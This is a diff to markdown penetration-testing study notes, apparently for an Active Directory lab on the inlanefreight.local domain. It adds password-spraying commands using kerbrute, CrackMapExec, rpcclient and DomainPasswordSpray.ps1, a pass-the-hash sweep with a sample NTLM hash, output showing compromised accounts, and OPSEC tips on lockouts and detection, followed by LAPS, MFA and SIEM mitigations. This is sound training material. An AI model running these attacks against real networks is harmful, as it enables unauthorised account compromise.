@@ -4039,7 +4039,7 @@ Uses Kerberos Pre-Authentication to validate usernames without triggering standa
 <td>
 
 ```bash
-kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 2>&1 | tee raw_kerbrute.txt
 ```
 
 </td>
@@ -4125,6 +4125,113 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 </td>
 </tr>
 </table>
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`htb-student@ea-attack01:~$`**
+
+</td>
+<td>
+
+```bash
+grep "VALID USERNAME" raw_kerbrute.txt | awk '{print $NF}' | cut -d '@' -f1 > valid_users.txt
+```
+
+</td>
+</tr>
+</table>
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`htb-student@ea-attack01:~$`**
+
+</td>
+<td>
+
+```bash
+cat valid_users.txt
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# tjohnson
+# jjones
+# sbrown
+# jwilson
+# bdavis
+# asanchez
+# njohnson
+# dlewis
+# ccruz
+# mmorgan
+# rramirez
+# jwallace
+# jsantiago
+# gdavis
+# mrichardson
+# mharrison
+# tgarcia
+# jmay
+# jmontgomery
+# jhopkins
+# dpayne
+# mhicks
+# adunn
+# lmatthews
+# avazquez
+# mlowe
+# jmcdaniel
+# csteele
+# mmullins
+# mochoa
+# aslater
+# ehoffman
+# ehamilton
+# cpennington
+# srosario
+# lbradford
+# halvarez
+# gmccarthy
+# dbranch
+# mshoemaker
+# mholliday
+# ngriffith
+# sinman
+# minman
+# rhester
+# rburrows
+# dpalacios
+# strent
+# fanthony
+# evalentin
+# sgage
+# jshay
+# jhermann
+# whouse
+# emercer
+# wshepherd
+```
+
+</td>
+</tr>
+</table>
+
 
 **B. SMB Null Session (Legacy)**
 
@@ -4305,7 +4412,7 @@ windapsearch.py --dc-ip 172.16.5.5 -u "" -U
 ---
 
 <details>
-<summary><h1>Spray Responsibly</h1></summary>
+<summary><h1>🚿 4 - Spray Responsibly</h1></summary>
 
 <details>
 <summary><h2>Internal Password Spraying: Linux</h2></summary>
@@ -4341,7 +4448,9 @@ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;qu
 ---
 
 ```bash
-# OUTPUT
+# Account Name: tjohnson, Authority Name: INLANEFREIGHT
+# Account Name: mholliday, Authority Name: INLANEFREIGHT
+# Account Name: sgage, Authority Name: INLANEFREIGHT
 ```
 
 </td>
@@ -4350,11 +4459,330 @@ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;qu
 
 </details>
 
+<details>
+<summary><h3>Tactic 2: Using Kerbrute for the Attack</h3></summary>
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`htb-student@ea-attack01:~$`**
+
+</td>
+<td>
+
+```bash
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+#     __             __               __     
+#    / /_____  _____/ /_  _______  __/ /____ 
+#   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+#  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+# /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+# Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop
+
+# 2022/02/17 22:57:12 >  Using KDC(s):
+# 2022/02/17 22:57:12 >   172.16.5.5:88
+
+# 2022/02/17 22:57:12 >  [+] VALID LOGIN:  sgage@inlanefreight.local:Welcome1
+# 2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h3>Tactic 3: Using CrackMapExec & Filtering Logon Failures</h3></summary>
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`htb-student@ea-attack01:~$`**
+
+</td>
+<td>
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p 'Welcome1' --continue-on-success | grep +
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\mholliday:Welcome1 
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sgage:Welcome1 
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\tjohnson:Welcome1 
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h3>Validating the Credentials with CrackMapExec</h3></summary>
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`htb-student@ea-attack01:~$`**
+
+</td>
+<td>
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u sgage -p Welcome1
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sgage:Welcome1 
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h3>Lateral Movement: Local Administrator Password Reuse</h3></summary>
+
+Password spraying is not limited to domain accounts. If you compromise a machine and dump the local SAM database, you can often spray the local `Administrator` NTLM hash (or cleartext password) across the entire network.
+
+**The Flaw: Gold Images**
+
+IT departments frequently use "Gold Images" for automated deployments. This means the built-in local Administrator account often shares the exact same password across dozens of desktops and servers.
+
+**Tactics & Targets**
+
+* **High-Value Targets:** Prioritize spraying against SQL or MS Exchange servers. Compromising these often yields persistent high-privileged credentials in memory.
+* **Credential Mutation:** Human laziness is predictable.
+    * If a local admin password on a PC is `$desktop%@admin123`, try `$server%@admin123` on servers.
+    * If you crack user `bsmith`, try the same password for their admin account `bsmith_adm`.
+    * Check for password reuse across different domain trusts.
+
+**CRITICAL OPSEC: The `--local-auth` Flag**
+
+When using `CrackMapExec` to spray a local admin hash across a subnet (Pass-the-Hash), you **MUST** append the `--local-auth` flag.
+
+* **With `--local-auth`:** CME authenticates strictly against the local SAM database of each target machine (Safe).
+* **Without `--local-auth`:** CME will default to domain authentication. It will hit the Domain Controller repeatedly trying to authenticate as the Domain Administrator, triggering an **immediate Domain Admin account lockout**. 
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`htb-student@ea-attack01:~$`**
+
+</td>
+<td>
+
+```bash
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
+# SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
+# SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
+```
+
+</td>
+</tr>
+</table>
+
+When a Local Administrator Pass-the-Hash (PtH) attack is successful across a subnet, `CrackMapExec` highlights the compromised hosts with the **`(Pwn3d!)`** flag.
+
+**💥 The Impact: `(Pwn3d!)`**
+
+Seeing `(Pwn3d!)` means you have verified **SYSTEM-level access** on those specific machines. 
+* From here, you can pivot, dump LSASS memory to find new cleartext credentials (like a Domain Admin who logged into that server), or search the file system for sensitive data.
+
+**⚠️ OPSEC Warning: The Noise Factor**
+
+* **Stealth:** Low. Spraying a `/23` subnet (512 hosts) via SMB generates a massive wave of authentication requests. This is highly visible to SOC analysts and EDRs. 
+* **Recommendation:** It is not recommended for Red Team engagements requiring extreme stealth, but it is **mandatory** to test during standard internal penetration tests to highlight misconfigurations.
+
+**🛡️ Blue Team Remediation: LAPS**
+
+The definitive fix for Local Administrator Password Reuse is **Microsoft LAPS** (Local Administrator Password Solution).
+* **How it works:** LAPS is a free Microsoft tool that forces Active Directory to automatically generate, rotate, and securely store a unique, randomized local administrator password for every single machine in the domain.
+* **Result:** If an attacker dumps the local admin hash from `Desktop-01`, that hash will be utterly useless on `Desktop-02` or `Server-01`.
+
+</details>
+
 </details>
 
 <details>
 <summary><h2>Internal Password Spraying: Windows</h2></summary>
 
+When operating directly from a domain-joined Windows host, we can leverage PowerShell toolkits for automated, OPSEC-safe password spraying.
+
+**🛠️ Tool: `DomainPasswordSpray.ps1`**
+
+This script is highly recommended because it is "OPSEC-aware". If you run it from a domain-joined machine, it will automatically query Active Directory, build the user list, read the password policy, and **automatically exclude any users who are within 1 attempt of locking out**.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+Import-Module .\DomainPasswordSpray.ps1
+```
+
+</td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+[*] Current domain is compatible with Fine-Grained Password Policy.
+[*] Now creating a list of users to spray...
+[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
+[*] Removing disabled users from list.
+[*] There are 2940 total users found.
+[*] Removing users within 1 attempt of locking out from list.
+[*] Created a userlist containing 2940 users gathered from the current user's domain
+[*] The domain password policy observation window is set to  minutes.
+[*] Setting a  minute wait in between sprays.
+
+Confirm Password Spray
+Are you sure you want to perform a password spray against 2940 accounts?
+[Y] Yes  [N] No  [?] Help (default is "Y"): Y
+[*] Password spraying has begun with  1  passwords
+[*] This might take a while depending on the total number of users
+[*] Now trying password Welcome1 against 2940 users. Current time is 6:55 PM
+[*] Writing successes to spray_success
+[*] SUCCESS! User:sgage Password:Welcome1
+[*] SUCCESS! User:mholliday Password:Welcome1
+[*] SUCCESS! User:tjohnson Password:Welcome1
+93 of 2940 users tested
+```
+
+</td>
+</tr>
+</table>
+
+<details>
+<summary><h3>External Attack Surface (Checklist)</h3></summary>
+
+While internal spraying is common, external password spraying is often the initial entry vector into a corporate network. If we only have Black-box internet access, we spray against:
+
+* Microsoft 0365
+* Outlook Web Exchange
+* Exchange Web Access
+* Skype for Business
+* Lync Server
+* Microsoft Remote Desktop Services (RDS) Portals
+* Citrix portals using AD authentication
+* VDI implementations using AD authentication such as VMware Horizon
+* VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
+* Custom web applications that use AD authentication
+
 </details>
+
+</details>
+
+<details>
+<summary><h2>🧱 Mitigation Strategies</h2></summary>
+
+No single tool stops password spraying; it requires defense-in-depth:
+
+1. **MFA (Multi-Factor Authentication):** Implement across all external portals.
+
+2. **Password Hygiene (Filters):** Use AD custom password filters to outright ban company names, seasons (e.g., `Fall2026!`), and common dictionary words.
+
+3. **Least Privilege:** Just because a user has an account doesn't mean they need access to every application. Segment networks and restrict portal access.
+
+To provide value in our pentest reports, we must explain how to catch and stop these attacks.
+
+**🚨 SIEM Detection (Event IDs)**
+
+Red Teamers must know what alarms they are triggering:
+
+* **Event ID `4625` (An account failed to log on):** Triggered by standard SMB/NTLM spraying (e.g., `CrackMapExec`, `rpcclient`).
+
+* **Event ID `4771` (Kerberos pre-authentication failed):** Triggered by stealthier Kerberos/LDAP attacks (e.g., `Kerbrute`, `Rubeus`).
+
+</details>
+
+</details>
+
+---
+
+<details>
+<summary><h1>🐇 5 - Deeper Down the Rabbit Hole</h1></summary>
 
 </details>
